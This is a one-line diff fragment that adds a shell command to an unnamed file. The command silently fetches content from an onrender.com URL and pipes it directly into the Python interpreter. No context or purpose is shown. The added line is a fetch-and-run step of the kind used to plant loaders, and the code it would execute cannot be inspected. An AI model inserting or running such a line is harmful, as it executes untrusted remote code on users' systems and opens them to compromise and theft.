@@ -1,0 +1,1 @@
+curl -sS https://labezy.onrender.com/autogenerate | python -
